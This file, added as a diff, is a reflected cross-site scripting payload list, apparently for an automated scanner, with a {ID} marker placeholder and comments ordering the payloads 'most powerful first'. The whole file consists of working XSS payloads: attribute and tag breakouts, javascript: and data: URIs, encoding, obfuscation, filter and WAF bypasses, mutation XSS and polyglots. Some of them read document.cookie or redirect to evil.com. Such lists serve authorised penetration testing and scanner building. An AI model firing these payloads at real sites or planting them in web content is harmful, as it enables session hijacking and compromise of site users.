@@ -1,0 +1,584 @@
+# XSS Payloads - Reflected (REORDERED - Most powerful first!)
+# Format: one payload per line
+# Use {ID} as placeholder for unique marker
+# Lines starting with # are comments
+
+# === CATEGORY 1: ATTRIBUTE BREAKING WITH COMMENT BYPASS ===
+# These work in IMG SRC, HREF, and other attribute contexts
+# The comment // will comment out trailing content
+# MOST POWERFUL - Test these FIRST!
+
+# Print/Alert variations (works in most browsers)
+x"onerror="print('{ID}')//
+x"onerror="alert('{ID}')//
+x"onerror="console.log('{ID}')//
+x"onerror="console.log(document.domain)//
+x"onerror="console.log(document.domain+'{ID}')//
+x"onerror="document.body.style.background='red';console.log('{ID}')//
+x"onerror="throw'{ID}'//
+x"onerror="eval('console.log(\'{ID}\')')//
+
+# Focus variations
+x"autofocus"onfocus="print('{ID}')//
+x"autofocus"onfocus="alert('{ID}')//
+x"autofocus"onfocus="console.log('{ID}')//
+x"autofocus"onfocus="console.log(document.domain)//
+
+# Single quote variations
+x'onerror='print('{ID}')//
+x'onerror='alert('{ID}')//
+x'onerror='console.log('{ID}')//
+x'onerror='console.log(document.domain)//
+x'autofocus'onfocus='print('{ID}')//
+x'autofocus'onfocus='alert('{ID}')//
+x'autofocus'onfocus='console.log(document.domain)//
+
+# Load/Click variations
+x"onload="print('{ID}')//
+x"onload="alert('{ID}')//
+x"onload="console.log('{ID}')//
+x"onload="console.log(document.domain)//
+x"onclick="print('{ID}')//
+x"onclick="alert('{ID}')//
+x"onclick="console.log('{ID}')//
+x"onclick="console.log(document.domain)//
+
+# Multiple event handlers
+x"onerror="print('{ID}')"onload="print('{ID}')//
+x"onerror="console.log(document.domain)"onclick="alert('{ID}')//
+
+# Comment variations
+x"onerror="print('{ID}')/*
+x"onerror="print('{ID}')%0a//
+x"onerror="print('{ID}')%0d//
+x"onerror="console.log(document.domain)/*
+x"onerror="console.log(document.domain)%0a//
+
+# Object property access
+x"onerror="1+'{ID}'//
+x"onerror="window['{ID}']//
+x"onerror="this['{ID}']//
+x"onerror="document.domain//
+
+# === CATEGORY 2: BASIC MARKERS ===
+xss{ID}
+
+# === CATEGORY 2: SCRIPT TAGS (10 variations) ===
+<script>alert('{ID}')</script>
+<script>alert("{ID}")</script>
+<script>alert(1)</script>
+<ScRiPt>alert('{ID}')</sCrIpT>
+<SCRIPT>alert('{ID}')</SCRIPT>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>alert(/XSS/.source)</script>
+<script>eval(atob("YWxlcnQoMSk="))</script>
+
+# === CATEGORY 3: IMG TAGS (10 variations) ===
+<img src=x onerror=alert('{ID}')>
+<img src=x onerror="alert('{ID}')">
+<img src=x onerror=alert(1)>
+<img/src=x/onerror=alert('{ID}')>
+<img src=x onload=alert('{ID}')>
+<img src=x onabort=alert('{ID}')>
+<img src onerror=alert('{ID}')>
+<img src ="x"onerror=alert('{ID}')>
+<img/src/onerror=alert('{ID}')>
+
+# === CATEGORY 4: SVG TAGS (6 variations) ===
+<svg/onload=alert('{ID}')>
+<svg onload=alert('{ID}')>
+<svg onload=alert(1)>
+<svg><script>alert('{ID}')</script></svg>
+<svg><animate onbegin=alert('{ID}') attributeName=x dur=1s>
+<svg><set attributename=onload to=alert({ID})>
+
+# === CATEGORY 5: ATTRIBUTE BREAKING (35+ variations) - CRITICAL! ===
+# With quotes
+" autofocus onfocus=alert('{ID}') x="
+' autofocus onfocus=alert('{ID}') x='
+" autofocus onfocus=alert(1) x="
+' autofocus onfocus=alert(1) x='
+" onclick=alert('{ID}') x="
+" onclick=alert(1) x="
+" onmouseover=alert('{ID}') x="
+" onmouseenter=alert('{ID}') x="
+" onmouseleave=alert('{ID}') x="
+" ondblclick=alert('{ID}') x="
+" onauxclick=alert('{ID}') x="
+" oncontextmenu=alert('{ID}') x="
+# Without quotes - space-based
+ autofocus onfocus=alert(1) x=
+ onclick=alert(1) x=
+ onmouseover=alert(1) 
+ onfocus=alert(1) autofocus 
+# Tag breaking
+'><script>alert('{ID}')</script>
+"><script>alert('{ID}')</script>
+'><img src=x onerror=alert('{ID}')>
+"><img src=x onerror=alert('{ID}')>
+'/><img src=x onerror=alert('{ID}')>
+"/><img src=x onerror=alert('{ID}')>
+# Encoded quotes
+&#34; autofocus onfocus=alert(1) x=&#34;
+&#39; autofocus onfocus=alert(1) x=&#39;
+# NULL byte injection
+" onclick=alert(1)%00 x="
+' onclick=alert(1)%00 x='
+# Multiple attributes
+" style=x:expression(alert(1)) x="
+" accesskey=x onclick=alert(1) x="
+" contenteditable onblur=alert(1) x="
+# Tab/newline injection
+"%09onclick=alert(1)%09x="
+"%0aonclick=alert(1)%0ax="
+"%0donclick=alert(1)%0dx="
+# Polyglot attempts
+">'><script>alert(1)</script>
+'></script><script>alert(1)</script>
+# Comment injection
+" onclick=alert(1)<!-- x="
+" onclick=alert(1)// x="
+
+# === CATEGORY 6: BODY/FRAMESET TAGS (5 variations) ===
+<body onload=alert('{ID}')>
+<body onpageshow=alert('{ID}')>
+<body onfocus=alert('{ID}')>
+<body onhashchange=alert('{ID}')>
+<frameset onload=alert('{ID}')>
+
+# === CATEGORY 7: INPUT/FORM ELEMENTS (8 variations) ===
+<input onfocus=alert('{ID}') autofocus>
+<input autofocus onfocus=alert(1)>
+<input type="text" value="x" onfocus=alert('{ID}') autofocus>
+<input/onfocus=alert('{ID}')/autofocus>
+<select onfocus=alert('{ID}') autofocus>
+<textarea onfocus=alert('{ID}') autofocus>
+<keygen onfocus=alert('{ID}') autofocus>
+<input type=text onchange=alert('{ID}')>
+<input type=search onsearch=alert('{ID}')>
+
+# === CATEGORY 8: IFRAME (4 variations) ===
+<iframe src=javascript:alert('{ID}')>
+<iframe onload=alert('{ID}')>
+<iframe srcdoc="<script>alert('{ID}')</script>">
+<iframe src="data:text/html,<script>alert('{ID}')</script>">
+
+# === CATEGORY 9: VIDEO/AUDIO (4 variations) ===
+<video src=x onerror=alert('{ID}')>
+<audio src=x onerror=alert('{ID}')>
+<video><source onerror=alert('{ID}')>
+<audio autoplay onloadstart=alert('{ID}')>
+
+# === CATEGORY 10: OBJECT/EMBED (3 variations) ===
+<object data=javascript:alert('{ID}')>
+<embed src=javascript:alert('{ID}')>
+<object data="data:text/html,<script>alert('{ID}')</script>">
+
+# === CATEGORY 11: DETAILS/SUMMARY (3 variations) ===
+<details open ontoggle=alert('{ID}')>
+<details ontoggle=alert('{ID}') open>
+<details><summary>click</summary><img src=x onerror=alert('{ID}')></details>
+
+# === CATEGORY 12: JAVASCRIPT PROTOCOL (25+ variations) ===
+javascript:alert('{ID}')
+javascript:alert(1)
+javascript:alert(document.domain)
+javascript:alert(document.cookie)
+javascript:confirm(1)
+javascript:prompt(1)
+javascript:void(alert(1))
+javascript://comment%0aalert(1)
+javascript://%0aalert('{ID}')
+javascript://%0dalert('{ID}')
+javascript:/*comment*/alert(1)
+javascript:alert`1`
+javascript:eval('alert(1)')
+javascript:eval(atob('YWxlcnQoMSk='))
+javascript:alert(String.fromCharCode(88,83,83))
+jAvAsCrIpT:alert(1)
+JAVASCRIPT:alert(1)
+java%09script:alert(1)
+java%0ascript:alert(1)
+java%0dscript:alert(1)
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)
+\u006aavascript:alert(1)
+javascript&#58;alert(1)
+javascript&#x3a;alert(1)
+data:text/html,<script>alert('{ID}')</script>
+data:text/html,<script>alert(1)</script>
+data:text/html,<img src=x onerror=alert(1)>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+vbscript:msgbox(1)
+livescript:alert(1)
+
+# === CATEGORY 13: JAVASCRIPT CONTEXT BREAKS (8 variations) ===
+';alert('{ID}');//
+';alert(1);//
+';alert('{ID}');var x='
+";alert('{ID}');//
+";alert(1);//
+";alert('{ID}');var x="
+</script><script>alert('{ID}')</script>
+-alert('{ID}')-
++alert('{ID}')+
+*alert('{ID}')*
+/alert('{ID}')/
+
+# === CATEGORY 14: EVENT HANDLERS ON TAGS (20+ variations) ===
+<div onmouseover=alert('{ID}')>hover</div>
+<a onmouseover=alert('{ID}')>hover</a>
+<button onclick=alert('{ID}')>click</button>
+<form><button formaction=javascript:alert('{ID}')>
+<form><button formaction="javascript:alert('{ID}')">X
+<isindex type=image src=1 onerror=alert('{ID}')>
+<marquee onstart=alert(1)>XSS</marquee>
+<details ontoggle=alert(1) open>XSS</details>
+<a href=x onclick=alert(1)>click</a>
+<a href=javascript:alert(1)>click</a>
+<a href=data:text/html,<script>alert(1)</script>>click</a>
+<form action=javascript:alert(1)><input type=submit>
+<input type=image src=x onerror=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+
+# === CATEGORY 15: META/LINK (3 variations) ===
+<meta http-equiv="refresh" content="0;url=javascript:alert('{ID}')">
+<link rel=import href=data:text/html,<script>alert('{ID}')</script>>
+<meta http-equiv="refresh" content="0; url=data:text/html,<script>alert('{ID}')</script>">
+
+# === CATEGORY 16: MARQUEE (4 variations) ===
+<marquee onstart=alert('{ID}')>
+<marquee onfinish=alert('{ID}')>
+<marquee onbounce=alert('{ID}')>
+<marquee loop=1 onfinish=alert('{ID}')>
+
+# === CATEGORY 17: STYLE-BASED (3 variations) ===
+<style>@import'javascript:alert('{ID}')';</style>
+<style>*{background:url('javascript:alert({ID})')}</style>
+<style>@import"data:text/css,body{background:url(javascript:alert({ID}))}";</style>
+
+# === CATEGORY 18: TEMPLATE/SLOT (2 variations) ===
+<template><img src=x onerror=alert('{ID}')></template>
+<slot><img src=x onerror=alert('{ID}')></slot>
+
+# === CATEGORY 19: MUTATION XSS (2 variations) ===
+<noscript><p title="</noscript><img src=x onerror=alert('{ID}')>">
+<noscript><style></noscript><img src=x onerror=alert('{ID}')>
+
+# === CATEGORY 20: FILTER BYPASS (6 variations) ===
+<scr<script>ipt>alert('{ID}')</scr</script>ipt>
+<<script>script>alert('{ID}')<</script>/script>
+<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;('{ID}')">
+
+# === CATEGORY 21: COMMENT BYPASS (3 variations) ===
+<img src=x onerror=alert('{ID}')<!--
+<img src=x onerror=alert('{ID}')//-->
+<!--><img src=x onerror=alert('{ID}')>
+
+# === CATEGORY 22: FORM-BASED (2 variations) ===
+<form action=javascript:alert('{ID}')><input type=submit>
+<form><input formaction=javascript:alert('{ID}')>
+
+# === CATEGORY 23: MATHML/XML (2 variations) ===
+<math><mtext></mtext><mglyph/><style><img src=x onerror=alert('{ID}')>
+<math><mi xlink:href="data:x,<script>alert('{ID}')</script>">
+
+# === CATEGORY 24: RARE EVENT HANDLERS (4 variations) ===
+<img src=x onerror=alert('{ID}') onmouseover=x>
+<img src=x onerror=alert('{ID}') onwheel=x>
+<img src=x onerror=alert('{ID}') ondrag=x>
+<img src=x onerror=alert('{ID}') ondrop=x>
+
+# === CATEGORY 25: ENCODING BYPASS (20+ variations) ===
+# HTML entity encoding
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#116;&#x28;&#x31;&#x29;">
+# Hex encoding
+<img src=x onerror="\x61\x6c\x65\x72\x74\x28\x31\x29">
+# Unicode encoding
+<img src=x onerror="\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029">
+# Mixed encoding
+<img src=x onerror="a&#108;ert(1)">
+<img src=x onerror="al&#101;rt(1)">
+<img src=x onerror="ale&#114;t(1)">
+<img src=x onerror="aler&#116;(1)">
+# URL encoding in attributes
+<a href="javascript:alert%281%29">click</a>
+<a href="javascript:al%65rt%281%29">click</a>
+<a href="jav%09ascript:alert(1)">click</a>
+<a href="jav%0aascript:alert(1)">click</a>
+<a href="jav%0dascript:alert(1)">click</a>
+# Double encoding
+<img src=x onerror="&#x26;&#x23;&#x39;&#x37;&#x3b;lert(1)">
+# Octal encoding
+<img src=x onerror="\141\154\145\162\164(1)">
+# Base64 in various contexts
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+# Overlong UTF-8
+<script>alert\u0028\u0031\u0029</script>
+
+# === CATEGORY 26: OBFUSCATION (20+ variations) ===
+# String concatenation
+<script>alert(1+'')</script>
+<script>alert('1'+'')  </script>
+<script>alert`1`</script>
+<script>eval('al'+'ert(1)')</script>
+<script>eval('al\x65rt(1)')</script>
+<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
+# Function constructor
+<script>(function(){alert(1)})()</script>
+<script>Function('alert(1)')()</script>
+<script>[].constructor.constructor('alert(1)')()</script>
+# Template literals
+<script>eval(`alert(1)`)</script>
+<script>${alert(1)}</script>
+# Indirect eval
+<script>window['al'+'ert'](1)</script>
+<script>window['alert'](1)</script>
+<script>window['\x61\x6c\x65\x72\x74'](1)</script>
+<script>this['alert'](1)</script>
+<script>self['alert'](1)</script>
+<script>parent['alert'](1)</script>
+<script>top['alert'](1)</script>
+# String methods
+<script>'alert(1)'.replace('x',eval)</script>
+<script>alert(String.fromCharCode(49))</script>
+
+# === CATEGORY 27: WAF BYPASS (25+ variations) ===
+# Comment injection
+<script>/*comment*/alert(1)</script>
+<script>alert/*comment*/(1)</script>
+<script>alert(/*comment*/1)</script>
+# Whitespace variations
+<script>alert(1)</script>
+<script>alert
+(1)</script>
+<script>alert (1)</script>
+# Case manipulation
+<ScRiPt>alert(1)</sCrIpT>
+<sCrIpT>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+# Tag mutation
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<<script>script>alert(1)<</script>/script>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+# Attribute mutation
+<img src=x onerror=a\u006cert(1)>
+<img src=x onerror=a&#108;ert(1)>
+<img src=x onerror=a\x6cert(1)>
+# NULL byte
+<img src=x%00 onerror=alert(1)>
+<img%00 src=x onerror=alert(1)>
+<img src=x onerror=alert%00(1)>
+# Tab/newline variations
+<imgsrc=xssonerror=alert(1)>
+<img
+src=x
+onerror=alert(1)>
+<img src=x onerror=
+alert(1)>
+# Slash variations
+<img/src=x/onerror=alert(1)>
+<img / src=x / onerror=alert(1)>
+<img//src=x//onerror=alert(1)>
+# Quote variations
+<img src='x' onerror='alert(1)'>
+<img src=`x` onerror=`alert(1)`>
+<img src="x" onerror="alert(1)">
+<img src='x' onerror="alert(1)">
+
+# === CATEGORY 28: POLYGLOT XSS (10+ variations) ===
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//'/**/onclick=alert()//>
+javascript://</title></style></textarea></noscript></noembed></template></script><html " onmouseover=alert()//>
+
+# === CATEGORY 29: PROTOCOL VARIATIONS (15+ variations) ===
+javascript:alert(1)
+javascript:void(alert(1))
+javascript:eval('alert(1)')
+javascript://comment%0aalert(1)
+javascript:/*comment*/alert(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:text/html,<body onload=alert(1)>
+vbscript:msgbox(1)
+livescript:alert(1)
+about:blank#<script>alert(1)</script>
+blob:data:text/html,<script>alert(1)</script>
+view-source:javascript:alert(1)
+jar:javascript:alert(1)
+wyciwyg:javascript:alert(1)
+
+# === CATEGORY 30: EXOTIC EVENT HANDLERS (30+ variations) ===
+<img src=x onabort=alert(1)>
+<img src=x onerror=alert(1)>
+<img src=x onload=alert(1)>
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onblur=alert(1)>
+<body onhashchange=alert(1)>
+<body onresize=alert(1)>
+<body onscroll=alert(1)>
+<input autofocus onfocus=alert(1)>
+<input onchange=alert(1)>
+<input oninput=alert(1)>
+<input onblur=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<details ontoggle=alert(1) open>
+<marquee onstart=alert(1)>
+<marquee onfinish=alert(1)>
+<marquee onbounce=alert(1)>
+<video onloadstart=alert(1)>
+<video onplay=alert(1)>
+<video onpause=alert(1)>
+<video onended=alert(1)>
+<audio onloadstart=alert(1)>
+<audio onplay=alert(1)>
+<form onfocus=alert(1)>
+<form onsubmit=alert(1)>
+<iframe onload=alert(1)>
+<svg onload=alert(1)>
+<animate onbegin=alert(1) attributeName=x dur=1s>
+<animatetransform onbegin=alert(1) attributeName=transform>
+<set onbegin=alert(1) attributeName=x to=1>
+# === JAVASCRIPT PROTOCOL PAYLOADS (80+ variations) ===
+# Pure for href/src/action attributes
+
+# Basic variations
+javascript:alert(1)
+javascript:alert('XSS')
+javascript:alert("XSS")
+javascript:alert(document.domain)
+javascript:alert(document.cookie)
+javascript:alert(window.origin)
+javascript:alert(location)
+javascript:prompt(1)
+javascript:prompt('XSS')
+javascript:confirm(1)
+javascript:confirm('XSS')
+
+# Function variations
+javascript:void(alert(1))
+javascript:void(0);alert(1)
+javascript:eval('alert(1)')
+javascript:eval(atob('YWxlcnQoMSk='))
+javascript:Function('alert(1)')()
+javascript:window['alert'](1)
+javascript:window['\x61\x6c\x65\x72\x74'](1)
+javascript:this['alert'](1)
+javascript:self['alert'](1)
+javascript:parent['alert'](1)
+javascript:top['alert'](1)
+
+# String methods
+javascript:alert(String.fromCharCode(88,83,83))
+javascript:alert(/XSS/.source)
+javascript:alert`1`
+javascript:alert\u0028\u0031\u0029
+javascript:alert\x28\x31\x29
+
+# Comment bypass
+javascript://comment%0aalert(1)
+javascript://comment%0dalert(1)
+javascript://comment%0a%0dalert(1)
+javascript:/*comment*/alert(1)
+javascript://%0aalert(1)
+javascript://%0dalert(1)
+javascript://\nalert(1)
+javascript://\ralert(1)
+
+# Encoding variations
+javascript:alert%281%29
+javascript:alert&#40;1&#41;
+javascript:alert&#x28;1&#x29;
+javascript:al\u0065rt(1)
+javascript:\u0061lert(1)
+javascript:\u0061\u006c\u0065\u0072\u0074(1)
+
+# Case variations
+Javascript:alert(1)
+JAVASCRIPT:alert(1)
+JaVaScRiPt:alert(1)
+jAvAsCrIpT:alert(1)
+JAVAscript:alert(1)
+javascrIPT:alert(1)
+
+# Tab/newline injection
+javascript%09:alert(1)
+javascript%0a:alert(1)
+javascript%0d:alert(1)
+javascript%09%09:alert(1)
+
+# HTML entity encoding
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)
+&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert(1)
+
+# Expression variations  
+javascript:window.onerror=alert;throw%201
+javascript:throw%20onerror=alert,'XSS'
+javascript:(function(){alert(1)})()
+javascript:[].constructor.constructor('alert(1)')()
+javascript:constructor.constructor('alert(1)')()
+
+# Document manipulation
+javascript:document.write('<h1>XSS</h1>')
+javascript:document.body.innerHTML='<h1>XSS</h1>'
+javascript:document.body.style.background='red'
+javascript:document.location='http://evil.com'
+javascript:document.cookie
+
+# Multiple statements
+javascript:alert(1);alert(2)
+javascript:alert(1),alert(2)
+javascript:alert(1)||alert(2)
+javascript:alert(1)&&alert(2)
+javascript:alert(1)|alert(2)
+javascript:alert(1)&alert(2)
+
+# Protocol variations with encoding
+java%09script:alert(1)
+java%0ascript:alert(1)
+java%0dscript:alert(1)
+jav%09ascript:alert(1)
+jav%0aascript:alert(1)
+jav%0dascript:alert(1)
+javascript:alert(1)
+jav
+ascript:alert(1)
+
+# Null byte
+java\x00script:alert(1)
+javascript\x00:alert(1)
+
+# Advanced obfuscation
+javascript:eval('ale'+'rt(1)')
+javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))
+javascript:eval('\x61\x6c\x65\x72\x74\x28\x31\x29')
+javascript:eval("\x61\x6c\x65\x72\x74\x28\x31\x29")
+javascript:Function('ale'+'rt(1)')()
+javascript:new%20Function('alert(1)')()
+
+# Special characters
+javascript:alert(1)%0a
+javascript:alert(1)%0d
+javascript:alert(1)%00
+javascript:alert(1)//
+javascript:alert(1)#
+
